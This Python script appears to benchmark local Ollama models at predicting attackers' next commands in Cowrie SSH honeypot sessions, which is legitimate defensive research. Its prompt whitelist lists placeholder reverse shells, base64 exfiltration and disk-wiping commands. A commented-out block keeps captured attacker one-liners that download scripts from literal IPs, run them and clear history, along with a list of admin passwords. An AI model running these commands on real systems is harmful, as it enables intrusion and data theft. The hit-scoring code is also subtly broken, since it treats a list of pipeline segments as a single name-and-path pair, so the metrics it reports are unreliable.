#!/usr/bin/env python3
"""
evaluate_ollama_topk.py (updated)

Modalità:
 - sessioni: valuta su file JSONL con sessioni (sliding window di predizioni)
 - single: prende un singolo comando (--single-cmd) o file di comandi (--single-file)
Per ogni predizione richiede top-K candidate a Ollama e:
 - stampa Expected (se disponibile) e poi i K candidate uno per riga
 - confronta permissivamente solo command name + path (ignora flag)
 - salva risultati in JSONL e summary.json

Esempi:
  # session mode (sliding pairs)
  python evaluate_ollama_topk.py --sessions output/cowrie_sessions_2020-02-29.jsonl \
    --model gemma:2b --k 5 --context-len 3 --out output/ollama_topk_results.jsonl --n 10

    python evaluate_ollama_topk.py --sessions output/cowrie_sessions_2020-02-29.jsonl \
    --model codellama --k 5 --context-len 3 --out output/ollama_topk_results.jsonl --n 10

    python evaluate_ollama_topk.py --sessions output/cowrie_sessions_2020-02-29.jsonl \
    --model llama3:8b --k 5 --context-len 3 --out output/ollama_topk_results.jsonl --n 10

  # single command
  python evaluate_ollama_topk.py --single-cmd "cat /proc/cpuinfo | grep name | wc -l" \
    --model gemma:2b --k 5 --out output/single_results.jsonl

Requisiti:
  pip install requests tqdm
"""
from __future__ import annotations
import argparse, json, os, re, time, random
from typing import List, Tuple
from tqdm import tqdm
import requests

# -------------------------
# Utils: normalization & parsing
# -------------------------
CMD_NAME_RE = re.compile(r"[a-zA-Z0-9._/\-]+")     # nome comando
PATH_RE = re.compile(r"(/[^ ]+|\.{1,2}/[^ ]+)")    # path-like
PLACEHOLDER_RE = re.compile(r"<[^>]+>")  # qualunque <...>
CODE_FENCE_RE = re.compile(r'```(?:bash|sh)?\s*(.*?)\s*```', re.S | re.I)

def normalize_for_compare(cmd: str) -> List[Tuple[str, str]]:
    """
    Normalizzazione estesa con gestione del pipelining.
    Ritorna una lista di tuple (name, path), una per ogni comando nella pipeline.

    Ad es.:
    "dmidecode | grep <STRING> | head -n <NUMBER>"

    → [
        ("dmidecode", ""),
        ("grep", ""),
        ("head", "")
      ]
    """

    if not cmd:
        return []

    s = cmd.strip()

    # 1) Rimuove code fences/backticks
    s = re.sub(r'^```(?:bash|sh)?|```$', '', s, flags=re.I).strip()
    s = s.replace('`', '')

    # 2) Rimuove intro ("next command is", etc.)
    s = re.sub(
        r'^(the next command( is|:)?|il prossimo comando( è|:)?|next command( is|:)?|predicted command( is|:)?)[\s:,-]*',
        '',
        s,
        flags=re.I
    ).strip()

    # 3) Divide tutta la pipeline
    segments = re.split(r"\s*\|\s*", s)

    results = []

    for seg in segments:
        seg = seg.strip()
        if not seg:
            continue

        # 4) Rimuove placeholder <...>
        seg_clean = PLACEHOLDER_RE.sub("", seg).strip()

        # 5) Rimuove redirection (> , 2> , >>) dalla singola pipeline
        seg_clean = re.split(r"\s*>\s*|\s*2>\s*|\s*>>\s*", seg_clean)[0].strip()

        # 6) Estrae nome comando
        m = CMD_NAME_RE.match(seg_clean)
        name = m.group(0).lower() if m else ""

        # 7) Estrae path-like (primo)
        path = ""
        pm = PATH_RE.search(seg_clean)
        if pm:
            path = pm.group(0)

        results.append((name, path))

    return results


def extract_candidates_from_response(resp_text: str, k: int) -> List[str]:
    """
    Estrae fino a k candidate:
    - preferisce code fence block
    - poi prime k righe non vuote
    - poi split per comma/semicolon
    """
    if not resp_text:
        return []
    m = CODE_FENCE_RE.search(resp_text)
    if m:
        block = m.group(1).strip()
        lines = [ln.strip() for ln in block.splitlines() if ln.strip()]
        if lines:
            return lines[:k]
    # lines
    lines = [ln.strip() for ln in resp_text.splitlines() if ln.strip()]
    if len(lines) >= k:
        return lines[:k]
    # cleaned numbered lines
    cleaned = []
    for ln in lines:
        ln2 = re.sub(r'^\s*\d+[\)\.\-]?\s*', '', ln).strip()
        if ln2:
            cleaned.append(ln2)
    if len(cleaned) >= k:
        return cleaned[:k]
    # fallback split by punctuation
    parts = [p.strip() for p in re.split(r'[,\;]\s*', resp_text) if p.strip()]
    out = cleaned + parts
    # deduplicate preserve order
    seen = set()
    final = []
    for c in out:
        if c not in seen:
            seen.add(c)
            final.append(c)
        if len(final) >= k:
            break
    if final:
        return final[:k]
    # ultimate fallback: take first non-empty tokens by newline
    out2 = []
    for ln in resp_text.splitlines():
        ln = ln.strip()
        if ln:
            out2.append(ln)
        if len(out2) >= k:
            break
    return out2[:k]

# -------------------------
# Ollama caller
# -------------------------
def query_ollama(prompt: str, model: str, url: str, temp: float=0.2, timeout: int=300) -> str:
    payload = {"model": model, "prompt": prompt, "temperature": temp, "stream": False}
    try:
        r = requests.post(url, json=payload, timeout=timeout)
    except requests.exceptions.RequestException as e:
        raise ConnectionError(f"Ollama connection error: {e}")
    if r.status_code != 200:
        raise RuntimeError(f"Ollama returned HTTP {r.status_code}: {r.text[:400]}")
    try:
        data = r.json()
    except Exception:
        return r.text.strip()
    if isinstance(data, dict):
        for k in ("response","output","text"):
            if k in data and isinstance(data[k], str):
                return data[k].strip()
        if "responses" in data and isinstance(data["responses"], list) and data["responses"]:
            r0 = data["responses"][0]
            return r0 if isinstance(r0, str) else str(r0)
    return r.text.strip()


# -------------------------
# WHITELIST + Prompt builders (uses whitelist)
# -------------------------

WHITELIST = [
    # --- SAFE GENERAL ---
    "whoami", "id", "groups", "hostname", "uptime",
    "uname", "uname -a", "uname -m", "lscpu", "lsmod",
    "ls", "ls -la", "ls -lh", "pwd", "cd",
    "ps aux", "top -b -n1", "free -m", "df -h", "w", "who", "env",
    "netstat -tunlp", "ss -tunlp", "ip a", "ifconfig",
    "ping -c 1",
    "crontab -l",
    "echo",

    # --- ADDITIONAL SAFE ENUMERATION ---
    "last", "lastlog", "finger",
    "getent passwd", "getent group",
    "which", "whereis",
    "python --version", "python3 --version",
    "perl --version", "ruby --version", "php --version",
    "bash --version", "sh --version",
    "lsblk", "mount", "du -sh",
    "find", "find -maxdepth 2 -type f", "find -maxdepth 2 -type d",
    "curl --version", "wget --version",
    "dig", "host", "traceroute", "arp -a", "route -n",
    "set", "alias", "history",

    # --- POTENZIALMENTE PERICOLOSI (USATI DAGLI ATTACCANTI) ---
    # File modification & deletion
    "rm", "rm -f", "rm -rf", "mv", "cp",

    # File download/upload
    "wget", "wget <URL>", "curl", "curl <URL>",
    "scp", "sftp",

    # Script execution / shell escalation
    "bash", "sh", "./<FILE>", "source <FILE>",
    "chmod +x <FILE>", "chmod 777 <FILE>", "chown root:root <FILE>",

    # Archiving / unpacking
    "tar -xf <FILE>", "unzip <FILE>", "gunzip <FILE>",

    # Persistence mechanisms
    "crontab <FILE>",
    "echo <PAYLOAD> >> <FILE>",
    "echo <PAYLOAD> >> <FILE>",

    # System modification (dangerous)
    "useradd <USER>", "userdel <USER>",
    "passwd <USER>",
    "kill", "killall", "pkill",
    "service <NAME> start", "service <NAME> stop",
    "systemctl start <SERVICE>", "systemctl stop <SERVICE>",

    # Networking & pivoting
    "nc", "nc -lvp <PORT>", "nc <IP> <PORT>",
    "ncat", "socat",
    "ssh <USER>@<IP>",

    # Data exfil placeholders
    "cat <FILE> | base64",
    "base64 < FILE", "xxd <FILE>",

    # Dangerous disk operations
    "dd if=<SRC> of=<DEST>",
    "mkfs.ext4 <DEVICE>",

    # Privilege escalation enumeration
    "sudo -l", "sudo su", "su",
    "find -perm -4000",
    "cat <FILE>",

    # Reverse shell placeholders
    "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1",
    "nc <IP> <PORT> -e /bin/bash",

    # Encoding / decoding / transformation
    "base64", "base64 -d",
    "xxd", "hexdump",

    # Process & memory info
    "pstree", "dmesg", "journalctl",

    # Enumeration
    "ls -R",
    "find",
]


# File critici (leggibili/modificabili/eliminabili e da monitorare)
WHITELISTFILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/gshadow",
    "/etc/sudoers",
    "/etc/sudoers.d/README",           # esempio di file in sudoers.d
    "/etc/ssh/sshd_config",
    "/etc/ssh/ssh_config",
    "/root/.ssh/authorized_keys",
    "/root/.bash_history",
    "/root/.profile",
    "/root/.bashrc",
    "/home/USERNAME/.ssh/authorized_keys",  # template, USERNAME da parametrizzare
    "/home/USERNAME/.bash_history",
    "/etc/hosts",
    "/etc/hosts.allow",
    "/etc/hosts.deny",
    "/etc/hostname",
    "/etc/resolv.conf",
    "/etc/issue",
    "/etc/os-release",
    "/etc/profile",
    "/etc/environment",
    "/etc/fstab",
    "/etc/mtab",
    "/boot/grub/grub.cfg",
    "/etc/default/grub",
    "/var/log/auth.log",
    "/var/log/secure",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/audit/audit.log",
    "/var/log/daemon.log",
    "/var/log/kern.log",
    "/var/log/lastlog",
    "/var/log/wtmp",
    "/var/log/btmp",
    "/var/log/faillog",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/etc/crontab",
    "/var/spool/cron/crontabs/root",
    "/var/spool/cron/crontabs/USERNAME",   # template
    "/etc/cron.d/cronjob",                 # esempio
    "/etc/cron.daily/example",             # esempio
    "/etc/cron.hourly/example",            # esempio
    "/etc/cron.weekly/example",            # esempio
    "/etc/cron.monthly/example",           # esempio
    "/var/spool/cron",                     # file or spool entry examples
    "/etc/rsyslog.conf",
    "/etc/systemd/system/override.conf",   # example override
    "/etc/systemd/system/some.service",    # template service file
    "/lib/systemd/system/some.service",
    "/etc/php/7.4/fpm/pool.d/www.conf",    # example PHP config (adjust version)
    "/etc/mysql/my.cnf",
    "/root/.my.cnf",
    "/etc/redis/redis.conf",
    "/etc/nginx/nginx.conf",
    "/etc/apache2/apache2.conf",
    "/etc/ssl/private/privkey.pem",
    "/etc/letsencrypt/live/example.com/privkey.pem",  # template
    "/etc/letsencrypt/renewal/example.com.conf",
    "/var/backups/backup.tar",             # example backup file
    "/var/backups/backup.tar.gz",
    "/var/lib/mysql/ibdata1",              # mysql data files (sensitive)
    "/var/lib/mysql/mysql.sock",
    "/var/lib/postgresql/data/PG_VERSION", # postgres example
    "/etc/docker/daemon.json",
    "/var/run/docker.sock",
    "/etc/kubernetes/admin.conf",
    "/root/.kube/config",
    "/home/USERNAME/.aws/credentials",
    "/root/.aws/credentials",
    "/etc/ssl/certs/ca-certificates.crt",
    "/etc/hosts.allow",
    "/etc/hosts.deny",
    "/etc/pam.d/common-password",
    "/etc/pam.d/sshd",
    "/etc/apt/sources.list",
    "/etc/yum.repos.d/CentOS-Base.repo",
    "/usr/local/bin/suspicious_binary",    # example/custom binaries to monitor
    "/usr/bin/ssh",
    "/bin/su",
    "/bin/sudo",
    "/usr/bin/ps",
    "/usr/bin/netstat",
    "/bin/ls",
    "/usr/bin/wget",
    "/usr/bin/curl",
    "/usr/bin/python3",
    "/usr/bin/perl",
    "/usr/bin/perl5",
    "/tmp/.sensitive_tmp_file",            # example temporary sensitive file
    "/var/tmp/.sensitive_tmp_file",
    "/etc/cron.allow",
    "/etc/cron.deny",
    "/etc/securetty",
    "/etc/ld.so.preload",
    "/etc/ld.so.conf",
    "/etc/modprobe.d/blacklist.conf",
    "/etc/exports",                        # NFS shares
    "/etc/smb.conf",                       # Samba config
    "/var/spool/mail/root",
    "/var/spool/mail/USERNAME",
    "/etc/systemd/system/rc-local.service",
    "/etc/rc.local",
    # add other common config files often targeted
    "/etc/default/ssh",
    "/etc/default/locale",
    "/etc/default/grub.d/40_custom",
]

# Cartelle critiche (terminano tutte con '/')
WHITELISTFOLDERS = [
    "/etc/<FILE>",
    "/etc/ssh/<FILE>",
    "/etc/ssl/<FILE>",
    "/etc/ssl/private/<FILE>",
    "/etc/letsencrypt/<FILE>",
    "/etc/systemd/system/<FILE>",
    "/lib/systemd/system/<FILE>",
    "/root/<FILE>",
    "/root/.ssh/<FILE>",
    "/home/<FILE>",
    "/home/USERNAME/<FILE>",
    "/home/USERNAME/.ssh/<FILE>",
    "/var/log/<FILE>",
    "/var/log/audit/<FILE>",
    "/var/log/nginx/<FILE>",
    "/var/log/apache2/<FILE>",
    "/var/backups/<FILE>",
    "/var/spool/cron/<FILE>",
    "/etc/cron.d/<FILE>",
    "/etc/cron.daily/<FILE>",
    "/etc/cron.hourly/<FILE>",
    "/etc/cron.weekly/<FILE>",
    "/etc/cron.monthly/<FILE>",
    "/var/tmp/<FILE>",
    "/tmp/<FILE>",
    "/dev/shm/<FILE>",
    "/run/<FILE>",
    "/var/run/<FILE>",
    "/var/lib/<FILE>",
    "/var/lib/docker/<FILE>",
    "/var/lib/mysql/<FILE>",
    "/var/lib/postgresql/<FILE>",
    "/var/lib/jenkins/<FILE>",
    "/var/www/<FILE>",
    "/srv/<FILE>",
    "/usr/bin/<FILE>",
    "/usr/local/bin/<FILE>",
    "/bin/<FILE>",
    "/sbin/<FILE>",
    "/lib/<FILE>",
    "/lib64/<FILE>",
    "/etc/nginx/<FILE>",
    "/etc/apache2/<FILE>",
    "/etc/pam.d/<FILE>",
    "/etc/ssh/<FILE>",
    "/etc/apt/<FILE>",
    "/etc/yum.repos.d/<FILE>",
    "/etc/docker/<FILE>",
    "/etc/kubernetes/<FILE>",
    "/root/.kube/<FILE>",
    "/root/.aws/<FILE>",
    "/home/USERNAME/.aws/<FILE>",
    "/etc/letsencrypt/live/<FILE>",
    "/etc/letsencrypt/archive/<FILE>",
    "/var/spool/mail/<FILE>",
    "/etc/ssl/certs/<FILE>",
    "/etc/ssl/private/<FILE>",
    "/etc/exports/<FILE>",
    "/etc/samba/<FILE>",
    "/etc/cron.allow/<FILE>",
    "/etc/cron.d/<FILE>",
    "/boot/<FILE>",
    "/boot/grub/<FILE>",
    "/etc/modprobe.d/<FILE>",
    "/etc/profile.d/<FILE>",
    "/etc/systemd/system/<FILE>",
    "/opt/<FILE>",
    "/mnt/<FILE>",
    "/media/<FILE>",
    "/etc/rsyslog.d/<FILE>",
    "/etc/logrotate.d/<FILE>",
    "/proc/<FILE>",
]


# ============================================
# 🧱 WHITELIST COMPLETA (aggregata da dataset Cowrie)
# ============================================
'''
WHITELIST = [
    # 🧍‍♂️ User / System info
    "whoami", "id", "groups", "hostname", "uptime",
    "uname", "uname -a", "uname -m",

    # 🧠 CPU / Hardware info
    "cat /proc/cpuinfo",
    "cat /proc/cpuinfo | grep name | wc -l",
    "cat /proc/cpuinfo | grep model | grep name | wc -l",
    "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
    "lscpu", "lscpu | grep Model", "lsmod", "dmidecode|grep Vendor|head -n 1",

    # ⚙️ Process / System monitoring
    "ps aux", "ps -x", "top", "top -b -n1", "LC_ALL=C top -bn1",
    "free -m", "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
    "df -h", "w", "who", "env", "dmesg | grep irtual", "lspci | grep irti",

    # 📁 File system / Navigation
    "ls", "ls -la", "ls -lh", "pwd", "cd /", "cd /tmp", "ls -lh $(which ls)",
    "ls /tmp", "ls /var/tmp", "cat /tmp/<FILE>", "cat /var/tmp/<FILE>",
    "cat /var/tmp/.var03522123 | head -n 1", "cat /var/tmp/.systemcache436621",

    # 🧾 Configuration / System files
    "cat /etc/passwd", "cat /etc/hosts", "cat /etc/os-release", "cat /etc/issue",

    # ⏰ Cron / Scheduling
    "crontab -l", "cat /etc/crontab",

    # 📡 Networking (read-only)
    "netstat -tunlp", "ss -tunlp", "ip a", "ifconfig", "ping -c 1 8.8.8.8",

    # 🧩 Temporary / Variable files
    "echo \"321\" > /var/tmp/.var03522123",
    "rm -rf /var/tmp/.var03522123",
    "rm -rf /var/tmp/dota*",
    "rm /tmp/foo; touch /tmp/foo;", "ls -al /tmp/foo;", "rm /tmp/foo;",

    # 🧮 Miscellaneous commands
    "^C",

    # 💾 Potential malicious / propagation commands (kept for detection context, not to execute)
    "killall -9 perl;cd /var/tmp/ ; cd /tmp/ ; rm -rf ssh1.txt ; wget http://185.234.217.21/ssh1.txt ; mv ssh1.txt wget.txt ; perl wget.txt 193.169.254.11; lwp-download http://185.234.217.21/ssh1.txt ; mv ssh1.txt lynx.txt ; perl lynx.txt 193.169.254.11;fetch http://185.234.217.21/ssh1.txt ; mv ssh1.txt fetch.txt ; perl fetch.txt 193.169.254.11; curl -O http://185.234.217.21/ssh1.txt ; mv ssh1.txt curl.txt ; perl curl.txt 193.169.254.11 ; rm -rf ssh1.txt wget.txt lynx.txt fetch.txt curl.txt",
    "cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://104.248.150.167/servicesd000/fx19.x86; cat fx19.x86 > sshupdate; chmod +x *; ./sshupdate r00ted; history -c",
    "cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://104.248.150.167/servicesd000/fx19.x86; cat fx19.x86 > ssh-xuma19; chmod +x ssh-xuma19; ./ssh-xuma19 r00ted; history -c",
    "echo \"cd /tmp; wget http://46.246.45.171/wget.sh || curl http://46.246.45.171/curl.sh -o curl.sh; chmod +x *.sh; ./wget.sh; ./curl.sh\" | sh",
    "cd /tmp; wget google.com",

    # 🔐 echo password attempts (for detection, sanitized)
    "echo \"admin guest\" > /tmp/up.txt",
    "echo \"admin admin1234\" > /tmp/up.txt",
    "echo \"admin 7ujMko0admin\" > /tmp/up.txt",
    "echo \"admin P@55w0rd\" > /tmp/up.txt",
    "echo \"admin access\" > /tmp/up.txt",
    "echo \"admin letmein\" > /tmp/up.txt",
    "echo \"admin articon\" > /tmp/up.txt",
    "echo \"admin nimda\" > /tmp/up.txt",
    "echo \"admin administrador\" > /tmp/up.txt",
    "echo \"admin p@$$wOrd\" > /tmp/up.txt",
    "echo \"admin password\" > /tmp/up.txt",
    "echo \"admin 123123\" > /tmp/up.txt",
    "echo \"admin qwe@1234\" > /tmp/up.txt",
    "echo \"admin qwe123\" > /tmp/up.txt",
    "echo \"admin 1q2w3e4r5t6y\" > /tmp/up.txt",
    "echo \"admin 4dm1n\" > /tmp/up.txt",
    "echo \"admin nospam\" > /tmp/up.txt",
    "echo \"admin changeme\" > /tmp/up.txt",
    "echo \"admin P@ssw0rds\" > /tmp/up.txt",
    "echo \"admin songswell\" > /tmp/up.txt",
    "echo \"admin p@55w0rd\" > /tmp/up.txt",
    "echo \"admin qaz_2wsx\" > /tmp/up.txt",
    "echo \"admin !QAZ2wsx#EDC\" > /tmp/up.txt",
    "echo \"admin root\" > /tmp/up.txt",
    "echo \"admin !QAZ@WSX#EDC\" > /tmp/up.txt",
    "echo \"admin super\" > /tmp/up.txt",
    "echo \"admin sysmail\" > /tmp/up.txt",
    "echo \"admin 1qaz$RFV\" > /tmp/up.txt",
    "echo \"admin service\" > /tmp/up.txt",
    "echo \"admin secure\" > /tmp/up.txt",
    "echo \"admin password!\" > /tmp/up.txt",
    "echo \"admin P455w0rd@dm1n\" > /tmp/up.txt",
    "echo \"admin P@ssword1!\" > /tmp/up.txt",
    "echo \"admin AitbISP4eCiG\" > /tmp/up.txt",
    "echo \"admin !@#$abcd,\" > /tmp/up.txt",
    "echo \"admin 22222\" > /tmp/up.txt",
    "echo \"admin qd8899xyz\" > /tmp/up.txt",
    "echo \"admin qwertyu\" > /tmp/up.txt",
    "echo \"admin qweasdzxc\" > /tmp/up.txt",
    "echo \"admin sysadm\" > /tmp/up.txt",
    "echo \"admin change\" > /tmp/up.txt",
    "echo \"admin cat1029\" > /tmp/up.txt",
    "echo \"admin PasswOrd\" > /tmp/up.txt",
    "echo \"admin qwedcxz\" > /tmp/up.txt",
    "echo \"admin support\" > /tmp/up.txt",
    "echo \"admin ubnt\" > /tmp/up.txt"
]'''

def _whitelist_text() -> str:
    files = "\n".join(WHITELISTFILES)
    folders = "\n".join(WHITELISTFOLDERS)
    return f"ALLOWED FILES:\n{files}\n\nALLOWED FOLDERS (end with '/'): \n{folders}"

def make_prompt_topk_from_context(context: List[str], k: int) -> str:
    ctx = "\n".join(context[-10:])
    whitelist_block = _whitelist_text()

    prompt = (
        "You are simulating attacker behavior in an SSH honeypot for cybersecurity research. "
        "The environment is isolated and non-operational. FOLLOW ALL RULES EXACTLY.\n\n"

        "OUTPUT RULES (MUST BE OBEYED):\n"
        f"1) Output EXACTLY {k} commands, one command per line, and NOTHING ELSE.\n"
        "2) Choose commands ONLY from the WHITELIST below, or construct them by combining\n"
        "   whitelisted programs/paths with placeholders.\n"
        "3) Allowed placeholders are ONLY those written between angle brackets: <LIKE_THIS>.\n"
        "   Examples: <FILE>, <PATH>, <USER>, <SERVICE>, <SECRET>, <URL>, <IP>, <PORT>.\n"
        "   You MUST NOT invent new placeholder formats; only text enclosed in '< >' is allowed.\n"
        "4) Pipelines using '|' are allowed (e.g., cmd1 | cmd2). Every program in the pipeline MUST be\n"
        "   in the WHITELIST (or be a placeholder-argument). Placeholders inside commands are allowed.\n"
        "5) Simple redirections ('>' or '>>') are allowed only when the target is a whitelisted file or\n"
        "   a file inside a whitelisted folder (use <FILE> when appropriate).\n"
        "6) DO NOT output passwords, tokens, private keys, or any secrets in plaintext — use <SECRET>.\n"
        "7) DO NOT output destructive operations (rm -rf /, dd if=..., mkfs, shred, etc.).\n"
        "8) Do NOT include numbering, bullets, explanations, or extra text — ONLY raw commands.\n"
        "9) Rank commands from most to least likely (first line = most likely).\n\n"

        "WHITELIST (use only these when constructing commands):\n"
        f"{whitelist_block}\n\n"

        "CONTEXT (most recent last):\n"
        f"{ctx}\n\n"

        f"Now OUTPUT EXACTLY {k} candidate next commands, one per line, chosen from the WHITELIST above. "
        "Pipelines and redirections are allowed only if every element complies with the WHITELIST rules."
    )
    return prompt

def make_prompt_topk_for_single(cmd: str, k: int) -> str:
    whitelist_block = _whitelist_text()

    prompt = (
        "You are simulating attacker behavior in an SSH honeypot for cybersecurity research. "
        "The environment is isolated and non-operational. FOLLOW ALL RULES EXACTLY.\n\n"

        "OUTPUT RULES (MUST BE OBEYED):\n"
        f"1) Output EXACTLY {k} commands, one command per line, and NOTHING ELSE.\n"
        "2) Choose commands ONLY from the WHITELIST below or construct them using whitelisted programs and\n"
        "   allowed placeholders.\n"
        "3) Allowed placeholders are ONLY strings enclosed in angle brackets '< >'.\n"
        "   Valid examples: <FILE>, <PATH>, <USER>, <SERVICE>, <SECRET>, <URL>, <IP>, <PORT>.\n"
        "   You MUST NOT use any placeholder not enclosed in '< >'.\n"
        "4) Pipelines ('|') are allowed. Every program in the pipeline MUST be in the WHITELIST.\n"
        "   Placeholders inside the pipeline are allowed.\n"
        "5) Simple redirections ('>' or '>>') are allowed only toward whitelisted files or files inside\n"
        "   whitelisted folders (use <FILE> if needed).\n"
        "6) DO NOT output passwords, tokens, private keys, or secrets — use <SECRET> instead.\n"
        "7) DO NOT output destructive commands (rm -rf, shred, dd if=..., mkfs, etc.).\n"
        "8) Do NOT include commentary, numbering, bullets, or anything except raw commands.\n"
        "9) Rank commands from most to least likely.\n\n"

        "WHITELIST (use only these when constructing commands):\n"
        f"{whitelist_block}\n\n"

        "LAST COMMAND EXECUTED (most recent):\n"
        f"{cmd}\n\n"

        f"Now OUTPUT EXACTLY {k} candidate next commands, one per line. "
        "Pipelines are allowed only if every element respects the WHITELIST rules."
    )
    return prompt

# -------------------------
# Main
# -------------------------
def main():
    ap = argparse.ArgumentParser(description="Evaluate Ollama top-K next-command prediction (sessions or single).")
    ap.add_argument("--sessions", help="JSONL sessions file: one JSON per line with fields: session, commands (list)")
    ap.add_argument("--single-cmd", help="Single command string to predict next for")
    ap.add_argument("--single-file", help="File with commands (one per line), run prediction for each")
    ap.add_argument("--model", default="gemma:2b", help="Ollama model name")
    ap.add_argument("--ollama-url", default="http://localhost:11434/api/generate")
    ap.add_argument("--out", default="output/ollama_topk_results.jsonl")
    ap.add_argument("--k", type=int, default=5, help="Top-K candidates")
    ap.add_argument("--context-len", type=int, default=3, help="Context length when using sessions")
    ap.add_argument("--n", type=int, default=0, help="Max steps to evaluate (0 = all)")
    ap.add_argument("--temp", type=float, default=0.15)
    ap.add_argument("--sleep", type=float, default=0.05)
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()

    # validate modes
    mode_sessions = bool(args.sessions)
    mode_single = bool(args.single_cmd or args.single_file)
    if not (mode_sessions or mode_single):
        raise SystemExit("Provide --sessions OR --single-cmd OR --single-file")

    # quick ping
    try:
        _ = query_ollama("Ping. Reply 'ok' only.", args.model, args.ollama_url, temp=0.0, timeout=10)
    except Exception as e:
        raise SystemExit(f"Unable to contact Ollama: {e}\nStart `ollama serve` and ensure model is pulled.")

    tasks = []  # each task: dict with context(list) and expected (optional) and meta
    if mode_sessions:
        if not os.path.exists(args.sessions):
            raise SystemExit(f"Sessions file not found: {args.sessions}")
        sessions = []
        with open(args.sessions, "r", encoding="utf-8") as f:
            for ln in f:
                ln = ln.strip()
                if not ln:
                    continue
                try:
                    obj = json.loads(ln)
                except:
                    continue
                sid = obj.get("session") or obj.get("session_id") or obj.get("id")
                cmds = obj.get("commands") or obj.get("cmds") or obj.get("commands_list")
                if not sid or not cmds or len(cmds) < 2:
                    continue
                sessions.append({"session": sid, "commands": cmds})
        # build sliding tasks: for each i -> i+1
        for sess in sessions:
            cmds = sess["commands"]
            for i in range(len(cmds) - 1):
                # build context window ending at cmds[i]
                start = max(0, i - (args.context_len - 1))
                context = cmds[start:i+1]  # include cmds[i] as last context command
                expected = cmds[i+1]
                tasks.append({"session": sess["session"], "index": i, "context": context, "expected": expected})
    else:
        # single mode
        single_cmds = []
        if args.single_cmd:
            single_cmds.append(args.single_cmd.strip())
        if args.single_file:
            if not os.path.exists(args.single_file):
                raise SystemExit(f"Single-file not found: {args.single_file}")
            with open(args.single_file, "r", encoding="utf-8") as f:
                for ln in f:
                    ln = ln.strip()
                    if ln:
                        single_cmds.append(ln)
        for cmd in single_cmds:
            tasks.append({"session": "single", "index": 0, "context": [cmd], "expected": None})

    if args.n and args.n > 0:
        random.seed(args.seed)
        random.shuffle(tasks)
        tasks = tasks[:args.n]

    total = len(tasks)
    print(f"Total prediction tasks: {total}")

    os.makedirs(os.path.dirname(args.out) or ".", exist_ok=True)
    fout = open(args.out, "w", encoding="utf-8")
    results = []

    topk_hits = 0
    top1_hits = 0
    non_empty = 0

    for t in tqdm(tasks, desc="Predicting", unit="step"):
        context = t["context"]
        expected = t.get("expected")
        # build prompt
        if len(context) == 1:
            prompt = make_prompt_topk_for_single(context[0], args.k)
        else:
            prompt = make_prompt_topk_from_context(context, args.k)

        try:
            raw = query_ollama(prompt, args.model, args.ollama_url, temp=args.temp, timeout=120)
            err = None
        except Exception as e:
            raw = ""
            err = str(e)

        candidates = extract_candidates_from_response(raw, args.k)
        candidates_clean = [re.sub(r'^```|```$|`', '', c).strip() for c in candidates]

        # print expected + candidates (each on its own line)
        print("\n---")
        print("Context (last commands):")
        for c in context:
            print("  " + c)
        if expected:
            print("Expected:", expected)
        else:
            print("Expected: (not provided)")

        print(f"Top-{args.k} candidates:")
        if not candidates_clean:
            if raw:
                print(" (no parsed lines, raw response below)\n")
                print(raw)
            else:
                print(" (no response)")
        else:
            for i, c in enumerate(candidates_clean, start=1):
                print(f" {i}. {c}")

        # permissive comparison: check if expected normalized matches any candidate normalized
        hit = False
        if expected and candidates_clean:
            exp_key = normalize_for_compare(expected)
            for rnk, cand in enumerate(candidates_clean, start=1):
                cand_key = normalize_for_compare(cand)
                # require same command name, and if expected has path require path compatibility
                name_match = (cand_key[0] == exp_key[0] and cand_key[0] != "")
                if exp_key[1]:
                    # expected has path -> require path exact or prefix match (permissive)
                    path_match = (cand_key[1] == exp_key[1]
                                  or (cand_key[1] and (exp_key[1].startswith(cand_key[1]) or cand_key[1].startswith(exp_key[1]))))
                else:
                    path_match = True
                if name_match and path_match:
                    hit = True
                    if rnk == 1:
                        top1_hits += 1
                    topk_hits += 1
                    break

        if candidates_clean:
            non_empty += 1

        rec = {
            "session": t.get("session"),
            "index": t.get("index"),
            "context": context,
            "expected_raw": expected,
            "candidates_raw": candidates_clean,
            "hit_in_topk": bool(hit),
            "error": err
        }
        fout.write(json.dumps(rec, ensure_ascii=False) + "\n")
        fout.flush()
        results.append(rec)
        time.sleep(args.sleep)

    fout.close()

    total_done = len(results)
    topk_rate = topk_hits / total_done if total_done else 0.0
    top1_rate = top1_hits / total_done if total_done else 0.0
    non_empty_rate = non_empty / total_done if total_done else 0.0

    summary = {
        "total_tasks": total_done,
        "non_empty": non_empty,
        "topk_hits": topk_hits,
        "top1_hits": top1_hits,
        "topk_rate": topk_rate,
        "top1_rate": top1_rate,
        "model": args.model,
        "k": args.k,
        "context_len": args.context_len
    }
    with open(args.out + ".summary.json", "w", encoding="utf-8") as s:
        json.dump(summary, s, indent=2)

    print("\n=== SUMMARY ===")
    print(f"Total tasks: {total_done}")
    print(f"Non-empty predictions: {non_empty}/{total_done} ({non_empty_rate*100:.2f}%)")
    print(f"Top-{args.k} hits: {topk_hits}/{total_done} -> {topk_rate*100:.2f}%")
    print(f"Top-1 hits: {top1_hits}/{total_done} -> {top1_rate*100:.2f}%")
    print(f"Detailed results: {args.out}")
    print(f"Summary: {args.out}.summary.json")

if __name__ == "__main__":
    main()